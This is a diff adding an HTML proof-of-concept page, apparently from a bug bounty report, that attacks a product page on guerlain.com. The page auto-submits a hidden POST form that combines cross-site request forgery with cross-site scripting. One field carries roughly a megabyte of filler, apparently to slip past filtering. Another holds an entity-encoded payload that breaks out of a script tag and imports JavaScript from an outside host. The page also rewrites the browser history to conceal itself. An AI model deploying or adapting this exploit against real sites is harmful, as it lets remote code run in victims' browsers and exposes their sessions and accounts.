@@ -1,0 +1,18 @@
+<html>
+<body>
+    <form
+        action="https://www.guerlain.com/fr/fr-fr/p/rouge-g-rouge-g-le-rouge-a-levres-soin-personnalisable-S000070.html"
+        method="POST">
+        <input type="hidden" name="a" value="a&#61;00000000000000[till_1MB_of_filler_chars]" />
+        <input type="hidden" name="uid" value="&#32;OasXM78888&quot;a8888&apos;a8888a" />
+        <input type="hidden" name="pShade"
+            value="&#x3c;&#x2f;script&#x3e;&#x3c;script&#x3e;import&#x28;&#x60;https&#x3a;&#x2f;&#x2f;poc&#x2e;ywh&#x2e;at&#x2f;js&#x2f;csrf&#x5f;xss&#x2e;js&#x6280;&#x29;&#x3c;&#x2f;script&#x3e;" />
+        <input type="submit" value="Submit request" />
+    </form>
+    <script>
+        history.pushState('', '', '/');
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
